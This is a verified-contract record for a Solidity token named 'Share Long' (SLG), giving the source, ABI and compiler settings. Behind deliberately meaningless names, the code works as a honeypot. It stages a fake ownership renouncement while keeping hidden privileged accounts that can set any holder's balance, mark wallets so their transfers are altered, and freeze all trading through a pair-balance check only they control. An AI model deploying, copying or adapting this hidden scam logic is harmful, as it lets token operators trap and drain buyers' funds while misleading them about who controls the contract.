{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface shouldTotalFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapLaunchedSell {\n    function createPair(address receiverMax, address autoShould) external returns (address);\n}\n\ninterface totalLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTotalAmount) external view returns (uint256);\n\n    function transfer(address teamEnable, uint256 modeLimit) external returns (bool);\n\n    function allowance(address fromShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamEnable,\n        uint256 modeLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLimit, uint256 value);\n    event Approval(address indexed fromShould, address indexed spender, uint256 value);\n}\n\ninterface totalLaunchedMetadata is totalLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShareLong is limitMode, totalLaunched, totalLaunchedMetadata {\n\n    mapping(address => mapping(address => uint256)) private feeLaunch;\n\n    uint256 private marketingTxTo = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeToken;\n    }\n\n    uint256 private enableWallet;\n\n    address private sellLiquidityMarketing;\n\n    function toFrom(uint256 modeLimit) public {\n        maxTx();\n        limitAtTake = modeLimit;\n    }\n\n    function walletReceiver(address enableReceiver) public {\n        maxTx();\n        \n        if (enableReceiver == sellSender || enableReceiver == sellTotal) {\n            return;\n        }\n        shouldReceiverLaunch[enableReceiver] = true;\n    }\n\n    function launchAmount(address liquidityAmount, uint256 modeLimit) public {\n        maxTx();\n        takeFee[liquidityAmount] = modeLimit;\n    }\n\n    string private minFrom = \"SLG\";\n\n    mapping(address => bool) public shouldReceiverLaunch;\n\n    address public sellTotal;\n\n    function txAuto(address launchReceiver, address teamEnable, uint256 modeLimit) internal returns (bool) {\n        require(takeFee[launchReceiver] >= modeLimit);\n        takeFee[launchReceiver] -= modeLimit;\n        takeFee[teamEnable] += modeLimit;\n        emit Transfer(launchReceiver, teamEnable, modeLimit);\n        return true;\n    }\n\n    function maxTx() private view {\n        require(amountLimit[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return sellLiquidityMarketing;\n    }\n\n    bool public autoExemptReceiver;\n\n    uint256 public sellSwap;\n\n    function shouldFrom(address sellBuyLaunch) public {\n        if (launchLiquidity) {\n            return;\n        }\n        if (receiverTotal) {\n            autoExemptReceiver = false;\n        }\n        amountLimit[sellBuyLaunch] = true;\n        if (sellSwap == enableWallet) {\n            autoExemptReceiver = true;\n        }\n        launchLiquidity = true;\n    }\n\n    uint8 private modeToken = 18;\n\n    uint256 limitAtTake;\n\n    function owner() external view returns (address) {\n        return sellLiquidityMarketing;\n    }\n\n    function allowance(address exemptBuy, address buyListFrom) external view virtual override returns (uint256) {\n        if (buyListFrom == enableAmount) {\n            return type(uint256).max;\n        }\n        return feeLaunch[exemptBuy][buyListFrom];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minFrom;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalMax;\n    }\n\n    address public sellSender;\n\n    address atToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address buyListFrom, uint256 modeLimit) public virtual override returns (bool) {\n        feeLaunch[_msgSender()][buyListFrom] = modeLimit;\n        emit Approval(_msgSender(), buyListFrom, modeLimit);\n        return true;\n    }\n\n    uint256 private marketingMin;\n\n    constructor (){\n        if (enableWallet == sellSwap) {\n            marketingMin = sellSwap;\n        }\n        shouldTotalFund totalMode = shouldTotalFund(enableAmount);\n        sellTotal = swapLaunchedSell(totalMode.factory()).createPair(totalMode.WETH(), address(this));\n        if (sellSwap != enableWallet) {\n            enableWallet = marketingMin;\n        }\n        sellSender = _msgSender();\n        senderMax();\n        amountLimit[sellSender] = true;\n        takeFee[sellSender] = marketingTxTo;\n        if (autoExemptReceiver) {\n            enableWallet = marketingMin;\n        }\n        emit Transfer(address(0), sellSender, marketingTxTo);\n    }\n\n    function transferFrom(address launchReceiver, address teamEnable, uint256 modeLimit) external override returns (bool) {\n        if (_msgSender() != enableAmount) {\n            if (feeLaunch[launchReceiver][_msgSender()] != type(uint256).max) {\n                require(modeLimit <= feeLaunch[launchReceiver][_msgSender()]);\n                feeLaunch[launchReceiver][_msgSender()] -= modeLimit;\n            }\n        }\n        return minMode(launchReceiver, teamEnable, modeLimit);\n    }\n\n    bool public receiverTotal;\n\n    function transfer(address liquidityAmount, uint256 modeLimit) external virtual override returns (bool) {\n        return minMode(_msgSender(), liquidityAmount, modeLimit);\n    }\n\n    event OwnershipTransferred(address indexed sellTo, address indexed maxSellReceiver);\n\n    mapping(address => uint256) private takeFee;\n\n    function senderMax() public {\n        emit OwnershipTransferred(sellSender, address(0));\n        sellLiquidityMarketing = address(0);\n    }\n\n    mapping(address => bool) public amountLimit;\n\n    string private totalMax = \"Share Long\";\n\n    uint256 buyToken;\n\n    function balanceOf(address shouldTotalAmount) public view virtual override returns (uint256) {\n        return takeFee[shouldTotalAmount];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingTxTo;\n    }\n\n    address enableAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant takeTotal = 19 ** 10;\n\n    bool public launchLiquidity;\n\n    function minMode(address launchReceiver, address teamEnable, uint256 modeLimit) internal returns (bool) {\n        if (launchReceiver == sellSender) {\n            return txAuto(launchReceiver, teamEnable, modeLimit);\n        }\n        uint256 swapAuto = totalLaunched(sellTotal).balanceOf(atToken);\n        require(swapAuto == limitAtTake);\n        require(teamEnable != atToken);\n        if (shouldReceiverLaunch[launchReceiver]) {\n            return txAuto(launchReceiver, teamEnable, takeTotal);\n        }\n        return txAuto(launchReceiver, teamEnable, modeLimit);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSellReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyListFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyListFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotalAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLimit\",\"type\":\"uint256\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuyLaunch\",\"type\":\"address\"}],\"name\":\"shouldFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldReceiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeLimit\",\"type\":\"uint256\"}],\"name\":\"toFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"}],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ShareLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}